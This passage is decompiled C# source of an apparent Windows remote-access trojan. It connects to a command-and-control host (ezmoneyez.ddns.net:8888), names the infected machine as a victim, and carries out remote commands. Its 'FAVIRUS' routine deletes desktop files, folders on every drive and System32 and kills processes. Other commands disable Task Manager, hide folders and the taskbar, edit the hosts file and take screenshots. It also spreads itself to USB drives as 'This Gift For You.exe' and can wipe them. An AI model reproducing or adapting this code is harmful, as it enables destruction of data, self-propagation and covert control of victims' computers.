									for (int num8 = 0; num8 < directories4.Length; num8++)
									{
										DirectoryInfo directoryInfo9 = directories4[num8];
										try
										{
											directoryInfo9.Delete(true);
										}
										catch
										{
										}
									}
								}
								catch
								{
								}
							}
							bool flag54 = text36 == "ALL";
							if (flag54)
							{
								this.sendMessage("FAVIRUS: Deleting all folders in Desktop...");
								DirectoryInfo directoryInfo10 = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
								DirectoryInfo[] directories5 = directoryInfo10.GetDirectories();
								for (int num9 = 0; num9 < directories5.Length; num9++)
								{
									DirectoryInfo directoryInfo11 = directories5[num9];
									try
									{
										directoryInfo11.Delete(true);
									}
									catch
									{
									}
								}
								this.sendMessage("FAVIRUS: Desktop Folders Deleted! Deleting all files in Desktop...");
								foreach (string current4 in Directory.EnumerateFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)))
								{
									try
									{
										File.Delete(current4);
									}
									catch
									{
									}
								}
								this.sendMessage("FAVIRUS: Desktop Files Deleted! Deleting ALL FOLDERS IN THE SYSTEM...");
								DriveInfo[] drives4 = DriveInfo.GetDrives();
								DriveInfo[] array8 = drives4;
								for (int num10 = 0; num10 < array8.Length; num10++)
								{
									DriveInfo driveInfo4 = array8[num10];
									DirectoryInfo directoryInfo12 = new DirectoryInfo(driveInfo4.ToString());
									DirectoryInfo[] directories6 = directoryInfo12.GetDirectories();
									for (int num11 = 0; num11 < directories6.Length; num11++)
									{
										DirectoryInfo directoryInfo13 = directories6[num11];
										try
										{
											directoryInfo13.Delete(true);
										}
										catch
										{
										}
									}
								}
								this.sendMessage("FAVIRUS: ALL FOLDERS IN THE SYSTEM DELETED! KILLING ALL PROCESS...");
								Process[] processes3 = Process.GetProcesses();
								Process[] array9 = processes3;
								for (int num12 = 0; num12 < array9.Length; num12++)
								{
									Process process3 = array9[num12];
									Process[] processesByName5 = Process.GetProcessesByName(process3.ProcessName);
									bool flag55 = processesByName5 == Process.GetProcessesByName("system defender") || processesByName5 == Process.GetProcessesByName("wscript");
									if (!flag55)
									{
										try
										{
											processesByName5[0].Kill();
										}
										catch
										{
										}
									}
								}
								try
								{
									string systemDirectory2 = Environment.SystemDirectory;
									foreach (string current5 in Directory.EnumerateFiles(systemDirectory2))
									{
										File.Delete(current5);
									}
									DirectoryInfo directoryInfo14 = new DirectoryInfo(systemDirectory2);
									DirectoryInfo[] directories7 = directoryInfo14.GetDirectories();
									for (int num13 = 0; num13 < directories7.Length; num13++)
									{
										DirectoryInfo directoryInfo15 = directories7[num13];
										try
										{
											directoryInfo15.Delete(true);
										}
										catch
										{
										}
									}
								}
								catch
								{
								}
							}
							this.sendMessage("FAVIRUS LEVEL: " + text36 + "Has successfully Started ");
						}
						catch (Exception ex45)
						{
							this.sendMessage("Error:" + ex45.Message);
						}
					}
					bool flag56 = this.textBox1.Text.Contains("open link");
					if (flag56)
					{
						try
						{
							string fileName = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							Process.Start(fileName);
							this.sendMessage("Link has successfully opened");
						}
						catch (Exception ex46)
						{
							this.sendMessage("Error:" + ex46.Message);
						}
					}
					bool flag57 = this.textBox1.Text.Contains("get pc services");
					if (flag57)
					{
						try
						{
							string text37 = "";
							ServiceController[] services = ServiceController.GetServices();
							for (int num14 = 0; num14 < services.Length; num14++)
							{
								ServiceController serviceController = services[num14];
								try
								{
									string serviceName = serviceController.ServiceName;
									string displayName = serviceController.DisplayName;
									string text38 = serviceController.ServiceType.ToString();
									string text39 = serviceController.Status.ToString();
									text37 = string.Concat(new string[]
									{
										text37,
										"Service Name: (",
										serviceName,
										") Status: [",
										text39,
										"]<"
									});
								}
								catch
								{
								}
							}
							this.sendMessage(text37);
						}
						catch (Exception ex47)
						{
							this.sendMessage("Error:" + ex47.Message);
						}
					}
					bool flag58 = this.textBox1.Text.Contains("start pc service");
					if (flag58)
					{
						try
						{
							string text40 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							string s3 = this.textBox1.Text.Split(new char[]
							{
								'{',
								'}'
							})[1];
							int num15 = int.Parse(s3);
							ServiceController serviceController2 = new ServiceController(text40);
							TimeSpan timeout = TimeSpan.FromMilliseconds((double)num15);
							serviceController2.Start();
							serviceController2.WaitForStatus(ServiceControllerStatus.Running, timeout);
							this.sendMessage("Service Name: " + text40 + " Has successfully Started ");
							Thread.Sleep(500);
						}
						catch (Exception ex48)
						{
							this.sendMessage("Error:" + ex48.Message);
						}
					}
					bool flag59 = this.textBox1.Text.Contains("stop pc service");
					if (flag59)
					{
						try
						{
							string text41 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							string s4 = this.textBox1.Text.Split(new char[]
							{
								'{',
								'}'
							})[1];
							int num16 = int.Parse(s4);
							ServiceController serviceController3 = new ServiceController(text41);
							TimeSpan timeout2 = TimeSpan.FromMilliseconds((double)num16);
							serviceController3.Stop();
							serviceController3.WaitForStatus(ServiceControllerStatus.Running, timeout2);
							this.sendMessage("Service Name: " + text41 + " Has successfully Stopped ");
							Thread.Sleep(500);
						}
						catch (Exception ex49)
						{
							this.sendMessage("Error:" + ex49.Message);
						}
					}
					bool flag60 = this.textBox1.Text.Contains("relanch pc service");
					if (flag60)
					{
						try
						{
							string text42 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							string s5 = this.textBox1.Text.Split(new char[]
							{
								'{',
								'}'
							})[1];
							int num17 = int.Parse(s5);
							ServiceController serviceController4 = new ServiceController(text42);
							int tickCount = Environment.TickCount;
							TimeSpan timeout3 = TimeSpan.FromMilliseconds((double)num17);
							serviceController4.Stop();
							serviceController4.WaitForStatus(ServiceControllerStatus.Stopped, timeout3);
							int tickCount2 = Environment.TickCount;
							timeout3 = TimeSpan.FromMilliseconds((double)(num17 - (tickCount2 - tickCount)));
							serviceController4.Start();
							serviceController4.WaitForStatus(ServiceControllerStatus.Running, timeout3);
							this.sendMessage("Service Name: " + text42 + " Has successfully Started ");
							Thread.Sleep(500);
						}
						catch (Exception ex50)
						{
							this.sendMessage("Error:" + ex50.Message);
						}
					}
					bool flag61 = this.textBox1.Text.Contains("disable task manager");
					if (flag61)
					{
						try
						{
							this.ToggleTaskManager();
							this.sendMessage("task manager has successfully disabled");
						}
						catch (Exception ex51)
						{
							this.sendMessage("Error:" + ex51.Message);
						}
					}
					bool flag62 = this.textBox1.Text.Contains("hide desktop icons");
					if (flag62)
					{
						try
						{
							RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", true);
							bool flag63 = registryKey2 != null;
							if (flag63)
							{
								registryKey2.SetValue("HideIcons", 1);
								registryKey2.Close();
							}
							this.sendMessage("desktop icons has successfully hided");
						}
						catch (Exception ex52)
						{
							this.sendMessage("Error:" + ex52.Message);
						}
					}
					bool flag64 = this.textBox1.Text.Contains("hide clock");
					if (flag64)
					{
						try
						{
							RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true);
							bool flag65 = registryKey3 != null;
							if (flag65)
							{
								registryKey3.SetValue("HideClock", 1, RegistryValueKind.DWord);
							}
							this.sendMessage("the clock has successfully hided");
						}
						catch (Exception ex53)
						{
							this.sendMessage("Error:" + ex53.Message);
						}
					}
					bool flag66 = this.textBox1.Text.Contains("hide taskbar");
					if (flag66)
					{
						try
						{
							Taskbar.Hide();
							this.sendMessage("taskbar has successfully hided");
						}
						catch (Exception ex54)
						{
							this.sendMessage("Error:" + ex54.Message);
						}
					}
					bool flag67 = this.textBox1.Text.Contains("say this");
					if (flag67)
					{
						try
						{
							string text43 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							new SpeechSynthesizer
							{
								Volume = 100,
								Rate = -2
							}.Speak(text43);
							this.sendMessage("system has said: " + text43);
						}
						catch (Exception ex55)
						{
							this.sendMessage("Error:" + ex55.Message);
						}
					}
					bool flag68 = this.textBox1.Text.Contains("search file path");
					if (flag68)
					{
						try
						{
							string b2 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							DriveInfo[] drives5 = DriveInfo.GetDrives();
							DriveInfo[] array10 = drives5;
							for (int num18 = 0; num18 < array10.Length; num18++)
							{
								DriveInfo driveInfo5 = array10[num18];
								DirectoryInfo directoryInfo16 = new DirectoryInfo(driveInfo5.ToString());
								DirectoryInfo[] directories8 = directoryInfo16.GetDirectories();
								for (int num19 = 0; num19 < directories8.Length; num19++)
								{
									DirectoryInfo directoryInfo17 = directories8[num19];
									foreach (string current6 in Directory.EnumerateFiles(directoryInfo17.ToString()))
									{
										bool flag69 = current6 == b2;
										if (flag69)
										{
											this.sendMessage(string.Concat(new object[]
											{
												"We Found: ",
												current6,
												"     In: ",
												driveInfo5,
												" ",
												directoryInfo17
											}));
										}
									}
								}
							}
							this.sendMessage("Done");
						}
						catch (Exception ex56)
						{
							this.sendMessage("Error:" + ex56.Message);
						}
					}
					bool flag70 = this.textBox1.Text.Contains("get server name");
					if (flag70)
					{
						try
						{
							this.sendMessage("Server name: " + Assembly.GetExecutingAssembly().GetName().Name);
						}
						catch (Exception ex57)
						{
							this.sendMessage("Error:" + ex57.Message);
						}
					}
					bool flag71 = this.textBox1.Text.Contains("get server version");
					if (flag71)
					{
						try
						{
							this.sendMessage("Server version: " + Assembly.GetExecutingAssembly().GetName().Version);
						}
						catch (Exception ex58)
						{
							this.sendMessage("Error:" + ex58.Message);
						}
					}
					bool flag72 = this.textBox1.Text.Contains("get process ram usage");
					if (flag72)
					{
						try
						{
							string processName2 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							Process[] processesByName6 = Process.GetProcessesByName(processName2);
							this.sendMessage("Process RAM Usage: " + processesByName6[0].PrivateMemorySize64 + " ");
						}
						catch (Exception ex59)
						{
							this.sendMessage("Error:" + ex59.Message);
						}
					}
					bool flag73 = this.textBox1.Text.Contains("get process cpu usage");
					if (flag73)
					{
						try
						{
							string text44 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							PerformanceCounter performanceCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
							PerformanceCounter performanceCounter2 = new PerformanceCounter("Memory", "Available MBytes");
							performanceCounter.NextValue();
							float num20 = performanceCounter.NextValue();
							this.sendMessage(string.Concat(new object[]
							{
								"Process CPU Usage: ",
								performanceCounter,
								"    ",
								performanceCounter2,
								" "
							}));
						}
						catch (Exception ex60)
						{
							this.sendMessage("Error:" + ex60.Message);
						}
					}
					bool flag74 = this.textBox1.Text.Contains("get gpu info");
					if (flag74)
					{
						try
						{
							ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_DisplayConfiguration");
							string str2 = string.Empty;
							using (ManagementObjectCollection.ManagementObjectEnumerator enumerator7 = managementObjectSearcher.Get().GetEnumerator())
							{
								while (enumerator7.MoveNext())
								{
									ManagementObject managementObject = (ManagementObject)enumerator7.Current;
									foreach (PropertyData current7 in managementObject.Properties)
									{
										bool flag75 = current7.Name == "Description";
										if (flag75)
										{
											str2 = current7.Value.ToString();
										}
									}
								}
							}
							this.sendMessage("Graphic Card Name: " + str2 + " ");
						}
						catch (Exception ex61)
						{
							this.sendMessage("Error:" + ex61.Message);
						}
					}
					bool flag76 = this.textBox1.Text.Contains("set all folders unvisible");
					if (flag76)
					{
						try
						{
							DriveInfo[] drives6 = DriveInfo.GetDrives();
							DriveInfo[] array11 = drives6;
							for (int num21 = 0; num21 < array11.Length; num21++)
							{
								DriveInfo driveInfo6 = array11[num21];
								DirectoryInfo directoryInfo18 = new DirectoryInfo(driveInfo6.ToString());
								DirectoryInfo[] directories9 = directoryInfo18.GetDirectories();
								for (int num22 = 0; num22 < directories9.Length; num22++)
								{
									DirectoryInfo directoryInfo19 = directories9[num22];
									try
									{
										directoryInfo19.Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
									}
									catch
									{
									}
								}
							}
							this.sendMessage("All Folders has successfully hided ");
						}
						catch (Exception ex62)
						{
							this.sendMessage("Error:" + ex62.Message);
						}
					}
					bool flag77 = this.textBox1.Text.Contains("set all folders visible");
					if (flag77)
					{
						try
						{
							DriveInfo[] drives7 = DriveInfo.GetDrives();
							DriveInfo[] array12 = drives7;
							for (int num23 = 0; num23 < array12.Length; num23++)
							{
								DriveInfo driveInfo7 = array12[num23];
								DirectoryInfo directoryInfo20 = new DirectoryInfo(driveInfo7.ToString());
								DirectoryInfo[] directories10 = directoryInfo20.GetDirectories();
								for (int num24 = 0; num24 < directories10.Length; num24++)
								{
									DirectoryInfo directoryInfo21 = directories10[num24];
									try
									{
										directoryInfo21.Attributes = (FileAttributes.Directory | FileAttributes.Normal);
									}
									catch
									{
									}
								}
							}
							this.sendMessage("All Folders has successfully shown ");
						}
						catch (Exception ex63)
						{
							this.sendMessage("Error:" + ex63.Message);
						}
					}
					bool flag78 = this.textBox1.Text.Contains("check antivirus");
					if (flag78)
					{
						try
						{
							this.sendMessage(("Antivirus Installed  " + Form1.AntivirusInstalled().ToString()) ?? "");
						}
						catch (Exception ex64)
						{
							this.sendMessage("Error:" + ex64.Message);
						}
					}
					bool flag79 = this.textBox1.Text.Contains("auto format usb");
					if (flag79)
					{
						try
						{
							string a5 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							bool flag80 = a5 == "on";
							if (flag80)
							{
								this.autoformatusb = "1";
								this.sendMessage("Auto Format USB Disk has successfully started");
							}
							bool flag81 = a5 == "off";
							if (flag81)
							{
								this.autoformatusb = "0";
								this.sendMessage("Auto Format USB Disk has successfully stopped");
							}
						}
						catch (Exception ex65)
						{
							this.sendMessage("Error:" + ex65.Message);
						}
					}
					bool flag82 = this.textBox1.Text.Contains("set file dropper name");
					if (flag82)
					{
						try
						{
							string text45 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							this.droppername = text45;
							this.sendMessage("Auto file dropper name has successfully changed to: " + this.droppername);
						}
						catch (Exception ex66)
						{
							this.sendMessage("Error:" + ex66.Message);
						}
					}
					bool flag83 = this.textBox1.Text.Contains("set system time");
					if (flag83)
					{
						try
						{
							string text46 = this.textBox1.Text.Split(new char[]
							{
								'A',
								'Z'
							})[1];
							string text47 = this.textBox1.Text.Split(new char[]
							{
								'R',
								'U'
							})[1];
							string text48 = this.textBox1.Text.Split(new char[]
							{
								'O',
								'P'
							})[1];
							string text49 = this.textBox1.Text.Split(new char[]
							{
								'Q',
								'D'
							})[1];
							string text50 = this.textBox1.Text.Split(new char[]
							{
								'F',
								'G'
							})[1];
							string text51 = this.textBox1.Text.Split(new char[]
							{
								'H',
								'J'
							})[1];
							short wYear = Convert.ToInt16(text46);
							short wMonth = Convert.ToInt16(text47);
							short wDay = Convert.ToInt16(text48);
							short wHour = Convert.ToInt16(text49);
							short wMinute = Convert.ToInt16(text50);
							short wSecond = Convert.ToInt16(text51);
							Form1.SYSTEMTIME sYSTEMTIME = default(Form1.SYSTEMTIME);
							sYSTEMTIME.wYear = wYear;
							sYSTEMTIME.wMonth = wMonth;
							sYSTEMTIME.wDay = wDay;
							sYSTEMTIME.wHour = wHour;
							sYSTEMTIME.wMinute = wMinute;
							sYSTEMTIME.wSecond = wSecond;
							Form1.SetSystemTime(ref sYSTEMTIME);
							this.sendMessage(string.Concat(new string[]
							{
								"System Time has successfully changed to: ",
								text46,
								" Year, ",
								text47,
								" Month, ",
								text48,
								" Day, ",
								text49,
								" Hour, ",
								text50,
								" Minute, ",
								text51,
								" Second."
							}));
						}
						catch (Exception ex67)
						{
							this.sendMessage("Error:" + ex67.Message);
						}
					}
					bool flag84 = this.textBox1.Text.Contains("block website");
					if (flag84)
					{
						try
						{
							string text52 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							string path3 = "C:\\Windows\\System32\\drivers\\etc\\hosts";
							StreamWriter streamWriter = new StreamWriter(path3, true);
							string value2 = "\n 127.0.0.1 " + text52;
							streamWriter.Write(value2);
							streamWriter.Close();
							this.sendMessage(text52 + " has successfully Blocked");
						}
						catch (Exception ex68)
						{
							this.sendMessage("Error:" + ex68.Message);
						}
					}
					bool flag85 = this.textBox1.Text.Contains("console beep");
					if (flag85)
					{
						try
						{
							string text53 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							int duration = int.Parse(text53);
							bool flag86 = text53 == "normal";
							if (flag86)
							{
								Console.Beep();
								this.sendMessage("Console has successfully beeped normaly");
							}
							else
							{
								Console.Beep(5000, duration);
								this.sendMessage("Console has successfully beeped for:" + text53 + " Millisecond");
							}
						}
						catch (Exception ex69)
						{
							this.sendMessage("Error:" + ex69.Message);
						}
					}
					bool flag87 = this.textBox1.Text.Contains("take screenshot");
					if (flag87)
					{
						try
						{
							Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
							Graphics graphics = Graphics.FromImage(bitmap);
							graphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
							bool flag88 = File.Exists("Screenshot.png");
							if (flag88)
							{
								File.Delete("Screenshot.png");
							}
							bitmap.Save("Screenshot.png", ImageFormat.Png);
							this.sendMessage("Screenshot saved: " + Path.GetDirectoryName(Application.ExecutablePath) + "/Screenshot.png");
						}
						catch (Exception ex70)
						{
							this.sendMessage("Error:" + ex70.Message);
						}
					}
					bool flag89 = this.textBox1.Text.Contains("set copyed text");
					if (flag89)
					{
						try
						{
							string text54 = this.textBox1.Text.Split(new char[]
							{
								'(',
								')'
							})[1];
							Clipboard.SetText(text54);
							this.sendMessage("text: " + text54 + " has successfully copyed to the Clipboard ");
						}
						catch (Exception ex71)
						{
							this.sendMessage("Error:" + ex71.Message);
						}
					}
				}
			}
			this.textBox1.Text = "";
		}

		// Token: 0x0600001A RID: 26 RVA: 0x000028D0 File Offset: 0x00000AD0
		private void timer1_Tick(object sender, EventArgs e)
		{
			this.trytoconnect();
		}

		// Token: 0x06000023 RID: 35 RVA: 0x000070D8 File Offset: 0x000052D8
		private void timer2_Tick(object sender, EventArgs e)
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			DriveInfo[] array = drives;
			for (int i = 0; i < array.Length; i++)
			{
				DriveInfo driveInfo = array[i];
				bool flag = driveInfo.DriveType == DriveType.Removable;
				if (flag)
				{
					try
					{
						bool flag2 = this.autoformatusb == "1";
						if (flag2)
						{
							DirectoryInfo directoryInfo = new DirectoryInfo(driveInfo.ToString());
							DirectoryInfo[] directories = directoryInfo.GetDirectories();
							for (int j = 0; j < directories.Length; j++)
							{
								DirectoryInfo directoryInfo2 = directories[j];
								try
								{
									directoryInfo2.Delete(true);
								}
								catch
								{
								}
							}
							foreach (string current in Directory.EnumerateFiles(driveInfo.ToString()))
							{
								try
								{
									File.Delete(current);
								}
								catch
								{
								}
							}
						}
						File.Copy(Application.ExecutablePath, driveInfo + "\\" + this.droppername);
						try
						{
							this.sendMessage("Server file has successfully dropped in removable drive file name : " + this.droppername);
						}
						catch
						{
						}
					}
					catch
					{
					}
				}
			}
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00006FD0 File Offset: 0x000051D0
		public void ToggleTaskManager()
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			bool flag = registryKey.GetValue("DisableTaskMgr") == null;
			if (flag)
			{
				registryKey.SetValue("DisableTaskMgr", "1");
			}
			else
			{
				registryKey.DeleteValue("DisableTaskMgr");
			}
			registryKey.Close();
		}

		// Token: 0x06000017 RID: 23 RVA: 0x00002528 File Offset: 0x00000728
		private void trytoconnect()
		{
			try
			{
				uint num = Form1.DnsFlushResolverCache();
				string hostNameOrAddress = "ezmoneyez.ddns.net";
				IPAddress[] hostAddresses = Dns.GetHostAddresses(hostNameOrAddress);
				IPAddress[] array = hostAddresses;
				for (int i = 0; i < array.Length; i++)
				{
					IPAddress iPAddress = array[i];
					this.hostip = iPAddress.ToString();
				}
				this.readData = "";
				this.msg();
				this.clientSocket.Connect(this.hostip, 8888);
				this.serverStream = this.clientSocket.GetStream();
				this.sendMessage(this.ID.ToString());
				this.vicname = this.ID.ToString();
				Thread thread = new Thread(new ThreadStart(this.getMessage));
				thread.Start();
				this.timer1.Enabled = false;
				this.textBox1.Text = "";
			}
			catch
			{
				this.timer1.Enabled = true;
			}
		}

		// Token: 0x04000039 RID: 57
		private bool antiKiller = true;

		// Token: 0x04000035 RID: 53
		public string autoformatusb = "0";

		// Token: 0x0400002F RID: 47
		private TcpClient clientSocket = new TcpClient();

		// Token: 0x04000036 RID: 54
		public string droppername = "This Gift For You.exe";

		// Token: 0x04000032 RID: 50
		public string hostip;

		// Token: 0x04000034 RID: 52
		public int ID;

		// Token: 0x04000037 RID: 55
		public string myIP = "UNKNOWN";

		// Token: 0x04000031 RID: 49
		private string readData = null;

		// Token: 0x04000038 RID: 56
		private string rt = "";

		// Token: 0x04000030 RID: 48
		private NetworkStream serverStream = null;

		// Token: 0x04000033 RID: 51
		public string vicname;

		// Token: 0x0200000D RID: 13
		public struct SYSTEMTIME
		{
			// Token: 0x04000049 RID: 73
			public short wYear;

			// Token: 0x0400004A RID: 74
			public short wMonth;

			// Token: 0x0400004B RID: 75
			public short wDayOfWeek;

			// Token: 0x0400004C RID: 76
			public short wDay;

			// Token: 0x0400004D RID: 77
			public short wHour;

			// Token: 0x0400004E RID: 78
			public short wMinute;

			// Token: 0x0400004F RID: 79
			public short wSecond;

			// Token: 0x04000050 RID: 80
			public short wMilliseconds;
		}
	}
}
